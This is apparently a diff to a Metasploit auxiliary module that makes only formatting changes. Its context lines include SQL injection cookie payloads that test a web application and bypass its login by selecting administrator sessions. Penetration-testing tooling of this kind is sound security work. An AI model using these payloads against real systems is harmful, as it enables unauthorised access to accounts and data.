@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def perform_sqli
-    # Note: using run_sql because there is a limit on the length of our queries
+    # NOTE: using run_sql because there is a limit on the length of our queries
     # will work only if we remove the casts, NULL value handling etc.
     digit_range = ('0'..'9')
     bit_range = ('0'..'1')
@@ -198,6 +198,7 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => "bauth=' or #{payload}--"
       })
       return Exploit::CheckCode::Unknown("Unable to connect to #{target_uri.path}") unless res
+
       res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
@@ -214,8 +215,10 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good 'Target seems to be vulnerable'
     if datastore['BypassLogin']
-      cookies = [ "' or id IN (select s.id from sessions as s " \
-      "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"]
+      cookies = [
+        "' or id IN (select s.id from sessions as s " \
+              "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"
+      ]
     else
       cookies = perform_sqli
     end
